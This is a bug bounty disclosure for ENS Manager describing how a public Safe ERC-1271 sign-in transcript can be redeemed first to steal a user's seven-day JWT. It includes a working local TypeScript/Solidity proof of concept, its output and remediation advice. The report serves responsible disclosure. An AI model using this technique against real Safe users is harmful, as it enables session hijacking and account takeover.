# 91348 w a critical public safe erc 1271 transcript can be redeemed first to steal an ens seven day jwt

## #91348 \[W\&A-Critical] Public Safe ERC-1271 transcript can be redeemed first to steal an ENS seven-day JWT

**Submitted on Aug 31st 2026 at 19:32:27 UTC by @crypt0n1337 for** [**Audit Competition | ENS**](https://immunefi.com/audit-competition/audit-competition-ens)

* **Report ID:** #91348
* **Report Type:** Websites & Apps
* **Report severity:** Critical
* **Target:** <https://github.com/immunefi-team/audit-comp-ens/tree/audit-comp-ready/workers>
* **Impacts:**
  * Unauthorized takeover of a user's smart account (Hybrid Custody Account) or authenticated session, letting an attacker transfer the victim's names or funds or act as them, such as:

    * adding, replacing, or escalating an account owner or co-owner
    * extending or widening a session key's authority beyond its intended scope or lifetime
    * stealing an authenticated session or bearer token

    (Exploiting the 7-day session-key design as described in the Known Issues is not eligible; a weakness that grants authority beyond its stated lifetime or permissions is in scope.)
  * Changing non-sensitive details of other users (including modifying browser local storage) without already-connected wallet interaction and with up to one click of user interaction, such as: Enabling/disabling notifications

### Description

## Public Safe ERC-1271 transcript can be redeemed first to steal an ENS seven-day JWT

### Summary

ENS Manager uses an unbound, first-presenter SIWE nonce. This becomes exploitable with a normally connected Safe wallet because Safe's supported off-chain EIP-1271 flow intentionally publishes the plaintext message and completed `preparedSignature` through its credentialless message API before returning the signature to the requesting dapp.

An unauthenticated observer who knows the victim Safe address can poll that API, copy the ENS SIWE message and `preparedSignature`, and call ENS `/auth/login` first. ENS validates the copied signature against the Safe, deletes the nonce, and issues the observer the Safe user's seven-day JWT. Safe Wallet waits three seconds after fetching the completed public message before returning the same signature to ENS, so the legitimate browser predictably arrives later and gets `INVALID_NONCE`.

The victim only connects Safe to ENS Manager and approves the expected ENS sign-in message. The attacker needs no victim key, existing token, browser access, malicious origin, shared device, CORS access, former-owner role, or on-chain transaction.

### Severity and impact

**Proposed severity: Critical.** The primary scope mapping is unauthorized takeover of an authenticated session/bearer token.

The new JWT is accepted by all API routes protected by `requireAuth` for seven days. For a victim with an existing Manager account, it permits reading account and notification metadata and performing authenticated actions, including changing notification preferences, adding or removing favorites, changing notification state, deleting notification channels, and changing transaction records. These actions are consequences of the stolen authenticated session, not a separate severity basis.

The victim can request another nonce and log in again, but that does not revoke the attacker's already issued stateless JWT.

### Preconditions

* The victim uses ENS Manager's normal WalletConnect option with a deployed Safe on Sepolia.
* The Safe uses the official compatibility handler and off-chain message signing.
* For the cleanest reproducible case, the Safe has ordinary EOA owners (for example, threshold one). Custom fallback handlers and nested contract-owner signature encodings are not claimed.
* The observer knows the public Safe address and polls its public Safe messages.

### Attack flow

{% stepper %}
{% step %}

### Connect and sign in

The victim connects Safe to ENS Manager and selects **Sign in with Wallet**.
{% endstep %}

{% step %}

### Create the SIWE message

ENS obtains a nonce and builds a valid SIWE message for the connected Safe address.
{% endstep %}

{% step %}

### Start Safe's off-chain signing flow

viem sends `personal_sign`; Safe Wallet decodes the transport hex to the raw SIWE text and starts its supported off-chain message-signing flow.
{% endstep %}

{% step %}

### Publish the completed proof

Safe owners approve the expected ENS message. Safe's service stores the raw message and owner confirmations. Once threshold is met, its credentialless GET/list response includes `preparedSignature`.
{% endstep %}

{% step %}

### Delay signature return

Safe Wallet fetches that completed response but defers returning the signature to ENS by `HIDE_DELAY = 3000` milliseconds.
{% endstep %}

{% step %}

### Redeem the public transcript

During this window, the observer copies `message`, `preparedSignature`, and the nonce embedded in the message, then calls ENS `/auth/login` with the Safe address.
{% endstep %}

{% step %}

### Issue the attacker's JWT

ENS's production `createJWT` consumes the global nonce, verifies the exact copied proof through ERC-1271, resolves the victim user, and issues a seven-day JWT to the observer.
{% endstep %}

{% step %}

### Reject the victim's login

The timer releases the signature to the victim's ENS browser. Its identical login request now fails with `INVALID_NONCE`.
{% endstep %}
{% endstepper %}

At two credentialless Safe API requests per second, a poller can make roughly six reads during the deliberate three-second return delay.

### Root cause

ENS stores only `nonce -> nonce` in KV. The login request requires the nonce, message, signature, and address but no secret or browser/session state held by the client that requested the nonce. Consequently, the signed transcript is a first-presenter bearer credential.

Atomic nonce deletion alone does not fix the issue. It only guarantees one winner; the public observer still receives the completed proof before the legitimate browser. Cloudflare KV's non-atomic get/delete and eventual consistency may amplify the problem but are not required for exploitation.

### Exact Safe/viem compatibility

Let `M` be the decoded SIWE text and:

```
h = hashMessage(M)
  = keccak256("\x19Ethereum Signed Message:\n" || len(M) || M)
```

Safe Wallet asks its EOA owners to sign:

```
EIP712Domain(chainId, verifyingContract = Safe)
SafeMessage(bytes message = h)
```

ENS's installed viem computes the same `h` and calls the Safe's standard:

```
isValidSignature(bytes32 h, bytes preparedSignature)
```

Safe v1.3/v1.4's compatibility adapter invokes the legacy bytes verifier with `abi.encode(h)`. Hashing those same 32 bytes as `SafeMessage.message` produces the digest signed by Safe Wallet. The local PoC independently calculates both digests (TypeScript wallet side and Solidity handler side), asserts equality, signs that Safe EIP-712 digest, and then passes the result through ENS's production `createJWT` and installed viem ERC-1271 verifier.

### Proof of concept

The PoC is completely local. It starts Anvil, deploys the Safe-compatible ERC-1271 harness, and never contacts ENS or Safe production services. Database persistence is replaced by an in-memory adapter; nonce creation/consumption, SIWE/ERC-1271 verification, JWT issuance, and JWT verification are imported from the frozen ENS competition code.

From the repository root:

```powershell
node node_modules\.pnpm\tsx@4.21.0\node_modules\tsx\dist\cli.mjs workers\api-worker\audit-artifacts\safe-siwe-public-replay-20260831\public-safe-proof-replay.poc.ts
```

Expected security assertions:

```json
{
  "publicProofWasAccepted": true,
  "safeCompatibilityControls": {
    "walletDigestMatchesHandlerDigest": true,
    "exactSafeEip712SignatureAccepted": true,
    "changedMessageAccepted": false,
    "wrongSafeEip712DomainAccepted": false,
    "disallowedEnsSiweDomainError": "INVALID_DOMAIN"
  },
  "victimResult": {
    "ok": false,
    "errorTag": "INVALID_NONCE",
    "message": "Invalid nonce"
  }
}
```

The full observed output is in `TEST-RESULTS.md`.

### Evidence

#### ENS frozen code

* `apps/manager/src/lib/wagmi.ts` configures generic WalletConnect.
* `apps/manager/src/features/notifications/data/queries/auth.ts` creates SIWE for `walletClient.account.address`, signs it, and submits the proof.
* `workers/api-worker/src/services/auth/index.ts` stores a bare global nonce, consumes it before verification, verifies SIWE, resolves the address's user, and signs a JWT.
* `workers/api-worker/src/core/auth/jwt.ts` sets a seven-day expiration and verifies HS256 bearer tokens without a revocation check.

#### Safe primary sources

* [WalletConnect advertises `personal_sign`](https://github.com/safe-global/safe-wallet-monorepo/blob/86e967630dd3b7dfc017f7d27a548a2a62907cbc/apps/web/src/features/walletconnect/constants.ts#L3-L8).
* [SafeWalletProvider dispatches `personal_sign`](https://github.com/safe-global/safe-wallet-monorepo/blob/86e967630dd3b7dfc017f7d27a548a2a62907cbc/apps/web/src/services/safe-wallet-provider/index.ts#L155-L157) and [routes it into `sdk.signMessage`](https://github.com/safe-global/safe-wallet-monorepo/blob/86e967630dd3b7dfc017f7d27a548a2a62907cbc/apps/web/src/services/safe-wallet-provider/index.ts#L307-L315).
* [Safe selects the off-chain `SignMessageFlow`](https://github.com/safe-global/safe-wallet-monorepo/blob/86e967630dd3b7dfc017f7d27a548a2a62907cbc/apps/web/src/services/safe-wallet-provider/useSafeWalletProvider.tsx#L63-L105).
* [Safe decodes UTF-8 personal-sign hex](https://github.com/safe-global/safe-wallet-monorepo/blob/86e967630dd3b7dfc017f7d27a548a2a62907cbc/apps/web/src/components/safe-apps/utils.ts#L23-L38) and [passes the decoded text to the signing flow](https://github.com/safe-global/safe-wallet-monorepo/blob/86e967630dd3b7dfc017f7d27a548a2a62907cbc/apps/web/src/components/tx-flow/flows/SignMessage/SignMessage.tsx#L248-L277).
* [SafeMessage hash construction](https://github.com/safe-global/safe-wallet-monorepo/blob/86e967630dd3b7dfc017f7d27a548a2a62907cbc/packages/utils/src/utils/safe-messages.ts#L32-L68).
* [Safe's three-second signature-return delay](https://github.com/safe-global/safe-wallet-monorepo/blob/86e967630dd3b7dfc017f7d27a548a2a62907cbc/apps/web/src/hooks/messages/useSyncSafeMessageSigner.ts#L50-L86).
* [Transaction Service builds `preparedSignature`](https://github.com/safe-global/safe-transaction-service/blob/3e0199c490ae571f395284cbc7a6e0bac881a15e/safe_transaction_service/safe_messages/models.py#L46-L55), [serializes the message and signature](https://github.com/safe-global/safe-transaction-service/blob/3e0199c490ae571f395284cbc7a6e0bac881a15e/safe_transaction_service/safe_messages/serializers.py#L189-L223), and [exposes list/retrieve views](https://github.com/safe-global/safe-transaction-service/blob/3e0199c490ae571f395284cbc7a6e0bac881a15e/safe_transaction_service/safe_messages/views.py#L24-L103).
* [Transaction Service defaults to `AllowAny`](https://github.com/safe-global/safe-transaction-service/blob/3e0199c490ae571f395284cbc7a6e0bac881a15e/config/settings/base.py#L346-L349), and [Safe documents credentialless access at two requests per second](https://docs.safe.global/core-api/how-to-use-api-keys).
* [Safe v1.4.1 compatibility adapter](https://github.com/safe-global/safe-smart-account/blob/v1.4.1/contracts/handler/CompatibilityFallbackHandler.sol#L24-L72).

#### Verifier primary sources

* [viem hashes the raw SIWE message](https://github.com/wevm/viem/blob/1b6a8880005a41fc3fd410d6a8f9ab9e6749f452/src/actions/siwe/verifySiweMessage.ts#L78-L84).
* [viem calls standard ERC-1271](https://github.com/wevm/viem/blob/1b6a8880005a41fc3fd410d6a8f9ab9e6749f452/src/actions/public/verifyHash.ts#L342-L365).

### Recommended remediation

{% stepper %}
{% step %}

### Bind redemption to client state

On nonce creation, set a high-entropy verifier in a Secure, HttpOnly, appropriately SameSite browser cookie and store only its hash with the nonce; or return a separate one-time redemption secret over TLS and retain it only in the requesting browser.
{% endstep %}

{% step %}

### Verify the redemption secret

Require and verify that secret on `/auth/login` before accepting the signed transcript.
{% endstep %}

{% step %}

### Consume credentials atomically

Consume the nonce and verifier atomically in a strongly consistent store.

The third step is defense in depth; without the client-bound secret, atomic first use still lets the observer win.
{% endstep %}
{% endstepper %}

### Testing safety

No production ENS, Safe, Transaction Service, Client Gateway, or third-party account was queried or modified. Public behavior and reachability are established from official source and documentation; exploit execution is local.

### Proof of Concept

This PoC is fully self-contained below and runs only against local Anvil. It imports the frozen production `createNonce`, `createJWT`, `verifyJWT`, and installed viem ERC-1271 verification paths. Only database persistence is replaced with an in-memory adapter.

#### File: `workers/api-worker/audit-artifacts/safe-siwe-public-replay-20260831/public-safe-proof-replay.poc.ts`

```ts
import { spawn, spawnSync } from 'node:child_process'
import { readFileSync } from 'node:fs'
import { dirname, join } from 'node:path'
import { fileURLToPath } from 'node:url'
import {
  type Address,
  createPublicClient,
  createWalletClient,
  defineChain,
  type Hex,
  hashMessage,
  hashTypedData,
  http,
} from 'viem'
import { privateKeyToAccount } from 'viem/accounts'
import {
  createSiweMessage,
  parseSiweMessage,
  verifySiweMessage,
} from 'viem/siwe'
import { AuthPayload, verifyJWT } from '../../src/core/auth/jwt.ts'
import { createJWT, createNonce } from '../../src/services/auth/index.ts'

const artifactDir = dirname(fileURLToPath(import.meta.url))
const bbRoot = fileURLToPath(new URL('../../../../../', import.meta.url))
const forge = join(bbRoot, '.tools', 'foundry-v1.7.1', 'forge.exe')
const anvil = join(bbRoot, '.tools', 'foundry-v1.7.1', 'anvil.exe')
const rpcUrl = 'http://127.0.0.1:18547'
const chain = defineChain({
  id: 11_155_111,
  name: 'Local Sepolia PoC',
  nativeCurrency: { name: 'Ether', symbol: 'ETH', decimals: 18 },
  rpcUrls: { default: { http: [rpcUrl] } },
})

const owner = privateKeyToAccount(
  '0xac0974bec39a17e36ba4a6b4d238ff944bacb478cbed5efcae784d7bf4f2ff80',
)
const userId = '11111111-1111-4111-8111-111111111111'

class MemoryKV {
  private readonly values = new Map<string, string>()

  async put(key: string, value: string) {
    this.values.set(key, value)
  }

  async get(key: string) {
    return this.values.get(key) ?? null
  }

  async delete(key: string) {
    this.values.delete(key)
  }
}

const env = {
  KV: new MemoryKV(),
  JWT_SECRET: 'local-poc-secret-not-used-outside-this-process',
} as unknown as CloudflareBindings

// Only persistence is replaced. Signature validation, nonce consumption and JWT
// issuance below are the production implementations.
const db = {
  query: {
    users: {
      findFirst: async () => undefined,
    },
  },
  insert: () => ({
    values: (row: { address: string }) => ({
      returning: async () => [{ id: userId, address: row.address }],
    }),
  }),
} as never

const sleep = (milliseconds: number) =>
  new Promise((resolve) => setTimeout(resolve, milliseconds))

const requireOk = <T>(
  label: string,
  result: { isOk(): boolean; value?: T; error?: unknown },
) => {
  if (!result.isOk()) throw new Error(`${label}: ${String(result.error)}`)
  return result.value as T
}

const safeDigest = ({
  message,
  safe,
  chainId = chain.id,
}: {
  message: string
  safe: Address
  chainId?: number
}) =>
  hashTypedData({
    domain: { chainId, verifyingContract: safe },
    primaryType: 'SafeMessage',
    types: { SafeMessage: [{ name: 'message', type: 'bytes' }] },
    message: { message: hashMessage(message) },
  })

// biome-ignore lint/complexity/noExcessiveCognitiveComplexity: keeping the end-to-end security assertions in one auditable flow is intentional.
const main = async () => {
  const build = spawnSync(forge, ['build'], {
    cwd: artifactDir,
    encoding: 'utf8',
  })
  if (build.status !== 0) throw new Error(build.stderr || build.stdout)

  const anvilProcess = spawn(
    anvil,
    ['--port', '18547', '--chain-id', String(chain.id), '--silent'],
    { stdio: ['ignore', 'pipe', 'pipe'], windowsHide: true },
  )

  try {
    const publicClient = createPublicClient({ chain, transport: http(rpcUrl) })
    for (let attempt = 0; ; attempt += 1) {
      try {
        await publicClient.getBlockNumber()
        break
      } catch {
        if (attempt === 49) throw new Error('Anvil did not become ready')
        await sleep(100)
      }
    }

    const compiled = JSON.parse(
      readFileSync(
        join(
          artifactDir,
          'out',
          'Mutable1271Wallet.sol',
          'SafeCompatibility1271Wallet.json',
        ),
        'utf8',
      ),
    ) as { abi: readonly unknown[]; bytecode: { object: Hex } }
    const walletClient = createWalletClient({
      account: owner,
      chain,
      transport: http(rpcUrl),
    })
    const deploymentHash = await walletClient.deployContract({
      abi: compiled.abi,
      bytecode: compiled.bytecode.object,
      args: [owner.address],
    })
    const receipt = await publicClient.waitForTransactionReceipt({
      hash: deploymentHash,
    })
    const smartWallet = receipt.contractAddress as Address

    const nonce = requireOk<string>('createNonce', await createNonce(env))
    const message = createSiweMessage({
      address: smartWallet,
      chainId: chain.id,
      domain: 'app.ens.domains',
      nonce,
      uri: 'https://app.ens.domains',
      version: '1',
    })

    // Build the same owner signature returned as preparedSignature by a
    // threshold-one, EOA-owned Safe. This signs the Safe EIP-712 digest, not
    // the SIWE hash directly.
    const walletSideSafeDigest = safeDigest({ message, safe: smartWallet })
    const handlerSideSafeDigest = await publicClient.readContract({
      address: smartWallet,
      abi: compiled.abi,
      functionName: 'safeMessageHash',
      args: [hashMessage(message)],
    })
    if (walletSideSafeDigest !== handlerSideSafeDigest) {
      throw new Error('Safe Wallet and compatibility-handler digests differ')
    }
    const preparedSignature = await owner.sign({
      hash: walletSideSafeDigest,
    })

    // This object models the fields exposed by Safe Transaction Service GET.
    // From this point onward the attacker only uses the copied public proof.
    const publicSafeMessage = {
      message,
      preparedSignature,
    }
    const copiedNonce = parseSiweMessage(publicSafeMessage.message).nonce
    if (!copiedNonce) throw new Error('public SIWE message has no nonce')

    const directErc1271Control = await verifySiweMessage(publicClient, {
      address: smartWallet,
      domain: 'app.ens.domains',
      message,
      nonce,
      signature: preparedSignature,
    })
    if (!directErc1271Control) {
      throw new Error('Safe-compatible ERC-1271 control did not verify')
    }

    const changedMessage = message.replace(
      '\n\nURI:',
      '\n\nattacker changed the signed text\n\nURI:',
    )
    const changedMessageAccepted = await verifySiweMessage(publicClient, {
      address: smartWallet,
      domain: 'app.ens.domains',
      message: changedMessage,
      nonce,
      signature: preparedSignature,
    })
    if (changedMessageAccepted) {
      throw new Error('changed SIWE message unexpectedly verified')
    }

    const wrongSafeDomainSignature = await owner.sign({
      hash: safeDigest({
        message,
        safe: smartWallet,
        chainId: chain.id + 1,
      }),
    })
    const wrongSafeDomainAccepted = await verifySiweMessage(publicClient, {
      address: smartWallet,
      domain: 'app.ens.domains',
      message,
      nonce,
      signature: wrongSafeDomainSignature,
    })
    if (wrongSafeDomainAccepted) {
      throw new Error('wrong Safe EIP-712 domain unexpectedly verified')
    }

    const attacker = await createJWT({
      env,
      client: publicClient,
      db,
      address: smartWallet,
      message: publicSafeMessage.message,
      signature: publicSafeMessage.preparedSignature,
      nonce: copiedNonce,
    })
    const stolenJwt = requireOk<string>('attacker createJWT', attacker)
    const acceptedPayload = requireOk(
      'verifyJWT',
      await verifyJWT(stolenJwt, env, AuthPayload),
    )

    // The legitimate browser submits the exact proof after Safe's 3-second UI
    // delay. ENS has already deleted the one-time nonce.
    const victim = await createJWT({
      env,
      client: publicClient,
      db,
      address: smartWallet,
      message: publicSafeMessage.message,
      signature: publicSafeMessage.preparedSignature,
      nonce: copiedNonce,
    })

    if (victim.isOk()) throw new Error('victim unexpectedly received a JWT')

    const disallowedNonce = requireOk<string>(
      'createNonce(disallowed domain)',
      await createNonce(env),
    )
    const disallowedMessage = createSiweMessage({
      address: smartWallet,
      chainId: chain.id,
      domain: 'attacker.example',
      nonce: disallowedNonce,
      uri: 'https://attacker.example',
      version: '1',
    })
    const disallowedDomain = await createJWT({
      env,
      client: publicClient,
      db,
      address: smartWallet,
      message: disallowedMessage,
      signature: await owner.sign({
        hash: safeDigest({ message: disallowedMessage, safe: smartWallet }),
      }),
      nonce: disallowedNonce,
    })
    if (disallowedDomain.isOk()) {
      throw new Error('disallowed ENS SIWE domain unexpectedly received a JWT')
    }

    console.log(
      JSON.stringify(
        {
          publicProofWasAccepted: true,
          safeCompatibilityControls: {
            walletDigestMatchesHandlerDigest:
              walletSideSafeDigest === handlerSideSafeDigest,
            exactSafeEip712SignatureAccepted: directErc1271Control,
            changedMessageAccepted,
            wrongSafeEip712DomainAccepted: wrongSafeDomainAccepted,
            disallowedEnsSiweDomainError: (
              disallowedDomain.error as { name?: string }
            ).name,
          },
          jwtSubject: acceptedPayload,
          victimResult: {
            ok: false,
            errorTag: (victim.error as { name?: string }).name,
            message: (victim.error as { message?: string }).message,
          },
        },
        null,
        2,
      ),
    )
  } finally {
    anvilProcess.kill()
  }
}

await main()
```

#### File: `workers/api-worker/audit-artifacts/safe-siwe-public-replay-20260831/src/Mutable1271Wallet.sol`

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.30;

/// @notice Local model of Safe v1.3/v1.4 CompatibilityFallbackHandler message
/// verification, used only by the PoC.
///
/// Safe Wallet asks owners to sign:
///   EIP712Domain(chainId, Safe address)
///   SafeMessage(bytes message = hashMessage(raw dapp message))
///
/// The compatibility handler's standard ERC-1271 adapter receives that
/// `hashMessage` value as bytes32 and forwards `abi.encode(dataHash)` into the
/// legacy bytes verifier. Hashing those 32 bytes as SafeMessage.message yields
/// the exact same EIP-712 digest. This contract implements that equation.
contract SafeCompatibility1271Wallet {
    bytes4 internal constant UPDATED_MAGIC_VALUE = 0x1626ba7e;
    bytes4 internal constant LEGACY_MAGIC_VALUE = 0x20c13b0b;

    bytes32 internal constant DOMAIN_SEPARATOR_TYPEHASH =
        0x47e79534a245952e8b16893a336b85a3d9ea9fa8c573f3d803afb92a79469218;
    bytes32 internal constant SAFE_MSG_TYPEHASH = 0x60b3cbf8b4a223d68d641b3b6ddf9a298e7f33710cf3d3a9d1146b5a6150fbca;

    address public owner;

    constructor(address initialOwner) {
        owner = initialOwner;
    }

    function setOwner(address nextOwner) external {
        require(msg.sender == owner, "not owner");
        owner = nextOwner;
    }

    /// @notice Standard ERC-1271 entry point used by viem.
    function isValidSignature(bytes32 dataHash, bytes calldata signature) external view returns (bytes4) {
        bytes4 legacyResult = _legacyIsValidSignature(abi.encode(dataHash), signature);
        return legacyResult == LEGACY_MAGIC_VALUE ? UPDATED_MAGIC_VALUE : bytes4(0xffffffff);
    }

    /// @notice Exposes the exact digest Safe owners sign for test controls.
    function safeMessageHash(bytes32 dataHash) external view returns (bytes32) {
        return _safeMessageHash(abi.encode(dataHash));
    }

    function _legacyIsValidSignature(bytes memory data, bytes calldata signature) internal view returns (bytes4) {
        if (signature.length != 65) return 0xffffffff;

        bytes32 r;
        bytes32 s;
        uint8 v;
        assembly ("memory-safe") {
            r := calldataload(signature.offset)
            s := calldataload(add(signature.offset, 32))
            v := byte(0, calldataload(add(signature.offset, 64)))
        }

        return ecrecover(_safeMessageHash(data), v, r, s) == owner ? LEGACY_MAGIC_VALUE : bytes4(0xffffffff);
    }

    function _safeMessageHash(bytes memory data) internal view returns (bytes32) {
        bytes32 domainSeparator = keccak256(abi.encode(DOMAIN_SEPARATOR_TYPEHASH, block.chainid, address(this)));
        bytes32 messageStructHash = keccak256(abi.encode(SAFE_MSG_TYPEHASH, keccak256(data)));
        return keccak256(abi.encodePacked(bytes1(0x19), bytes1(0x01), domainSeparator, messageStructHash));
    }
}
```

#### File: `workers/api-worker/audit-artifacts/safe-siwe-public-replay-20260831/foundry.toml`

```toml
[profile.default]
src = "src"
out = "out"
solc_version = "0.8.30"
optimizer = true
optimizer_runs = 200
```

#### Run

From the frozen repository root:

```powershell
node node_modules\.pnpm\tsx@4.21.0\node_modules\tsx\dist\cli.mjs workers\api-worker\audit-artifacts\safe-siwe-public-replay-20260831\public-safe-proof-replay.poc.ts
```

## Test results

### Environment

* Frozen ENS competition repository
* Local Anvil, chain ID `11155111`
* Foundry `v1.7.1`
* ENS-installed viem `2.52.2`
* No production or third-party service requests

### Command

Run from `D:\Pentest\bb\ens-competition`:

```powershell
node node_modules\.pnpm\tsx@4.21.0\node_modules\tsx\dist\cli.mjs workers\api-worker\audit-artifacts\safe-siwe-public-replay-20260831\public-safe-proof-replay.poc.ts
```

### Observed result

Exit code: `0`

```
{"timestamp":"2026-08-31T19:19:23.776Z","level":"trace","message":"SIWE user resolved","userId":"11111111-1111-4111-8111-111111111111","address":"0x5fbdb2315678afecb367f032d93f642f64180aa3"}
{
  "publicProofWasAccepted": true,
  "safeCompatibilityControls": {
    "walletDigestMatchesHandlerDigest": true,
    "exactSafeEip712SignatureAccepted": true,
    "changedMessageAccepted": false,
    "wrongSafeEip712DomainAccepted": false,
    "disallowedEnsSiweDomainError": "INVALID_DOMAIN"
  },
  "jwtSubject": {
    "user_id": "11111111-1111-4111-8111-111111111111",
    "address": "0x5fbdb2315678afecb367f032d93f642f64180aa3"
  },
  "victimResult": {
    "ok": false,
    "errorTag": "INVALID_NONCE",
    "message": "Invalid nonce"
  }
}
```

### Assertions

| Assertion                                                                  |                  Result |
| -------------------------------------------------------------------------- | ----------------------: |
| TypeScript Safe Wallet digest equals Solidity compatibility-handler digest |                    PASS |
| Safe EIP-712 owner signature passes installed viem ERC-1271 verification   |                    PASS |
| Copied public transcript passes production `createJWT`                     |                    PASS |
| Issued JWT passes production `verifyJWT` and carries victim wallet/user    |                    PASS |
| Legitimate second redemption fails after attacker consumes nonce           |  PASS (`INVALID_NONCE`) |
| Changed SIWE text is rejected with original signature                      |                    PASS |
| Signature over wrong Safe EIP-712 chain domain is rejected                 |                    PASS |
| Correct signature for disallowed ENS SIWE domain is rejected               | PASS (`INVALID_DOMAIN`) |

### Independent red-team

An independent agent re-ran the enhanced PoC with exit code `0` and verified:

* the exact Safe v1.4.1 digest/adapter equation;
* normal Manager WalletConnect `personal_sign` reachability;
* public Safe message list/retrieve behavior and practical three-second window;
* production JWT issuance and legitimate-client nonce failure;
* all negative controls; and
* separation from R2-03, R2-06, stale-owner JWT, SEC-MGR-003, CORS, shared-device, and phishing lanes.

Red-team verdict: **PASS / survivor**.

### Generated files

The PoC compiles Solidity into `out/` and `cache/` at runtime. Those generated directories are deliberately excluded from the frozen evidence package and can be regenerated by rerunning the command.
